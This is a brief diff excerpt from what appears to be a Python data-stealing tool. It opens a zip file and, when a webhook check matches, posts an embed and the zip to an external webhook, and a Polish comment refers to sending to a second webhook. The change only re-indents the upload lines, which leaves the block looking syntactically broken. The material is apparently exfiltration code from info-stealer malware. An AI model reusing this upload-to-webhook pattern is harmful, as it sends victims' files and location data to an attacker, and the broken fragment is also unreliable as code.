@@ -896,8 +896,8 @@ GoogleMaps: {self.googlemap}
 
         with open(_zipfile, "rb") as f:
             if self.hook_reg in self.webhook:
-            httpx.post(self.webhook, json=embed)
-            httpx.post(self.webhook, files={"upload_file": f})
+        httpx.post(self.webhook, json=embed)
+        httpx.post(self.webhook, files={"upload_file": f})
 
         # Wysyłanie do webhooka 2
         if self.hook_reg in self.webhook2:
